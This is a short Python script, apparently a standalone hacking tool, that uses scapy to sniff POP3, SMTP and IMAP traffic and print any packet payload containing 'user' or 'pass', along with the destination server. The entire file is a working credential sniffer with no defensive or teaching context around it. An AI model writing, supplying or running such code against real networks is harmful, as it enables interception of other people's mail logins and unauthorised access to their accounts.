from scapy.all import *

# Packet callback function
def packet_callback(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(Raw):
        mail_packet = packet[Raw].load.decode(errors="ignore")

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(f"[*] Server: {packet[scapy.IP].dst}")
            print(f"[*] Payload:\n{mail_packet}\n")

# Start sniffing mail traffic (POP3, SMTP, IMAP)
sniff(
    filter="tcp port 110 or tcp port 25 or tcp port 143",
    prn=packet_callback,
    store=0
)
